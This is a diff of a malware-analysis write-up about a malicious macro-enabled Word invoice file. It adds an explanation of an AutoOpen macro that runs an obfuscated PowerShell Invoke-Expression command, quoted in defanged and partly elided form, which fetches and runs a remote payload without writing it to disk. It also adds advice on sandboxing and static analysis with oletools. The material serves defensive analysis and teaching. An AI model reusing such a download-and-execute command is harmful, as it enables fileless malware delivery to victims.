@@ -67,16 +67,20 @@ The file **INVOICE PACKAGE LINK TO DOWNLOAD.docm** was identified as malicious b
   <em>Figure 2: VirusTotal Screenshot</em>
 </p>
 
+When the document is opened, the AutoOpen macro is launched, which executes a **PowerShell** command. The script calls the command:
 
+*pwsh[.]exe -Command "EX ( ... ).Invoke('hxxps[:]//filetransfer[.]io/data-package/UR2whuBw/download
+')"*
 
-
-The “IP Abuse Reports” section contains information on the number of reports from 312 different sources. The table shows sample reports where the comment indicates “SSH-Attack” and its category is “Brute-Force” and “SSH”. After analyzing both sources, it can now be concluded that this address has suspicious intentions.
+The alias EX stands for *Invoke-Expression*, a function used to execute the passed code. **PowerShell** connects to the specified URL, downloads the remote payload, and runs it without saving the file to disk, which is known as fileless execution. Additionally, the code is obfuscated by dividing it into fragments and connecting them with “+” characters, which is a typical technique used to make detection by security systems more difficult.
 
 <p align="center">
   <img src="../02_Tools_VT_&_ANY-RUN/Shell_Commands.png" width="600">
   <br>
   <em>Figure 2: VirusTotal - Shell Commands</em>
 </p>
+
+After opening a *.docm* file in a sandbox environment, you can verify its behavior and check whether it contains malicious macros. Additionally, tools such as oletools can be used to perform static analysis of the document, including detection of macros, suspicious functions, and code obfuscation techniques. This allows you to confirm whether the file contains obfuscated or potentially malicious code before it is executed.
 
 <p align="center">
   <img src="../03_Macros_Office_File/Macros_Office.png" width="600">
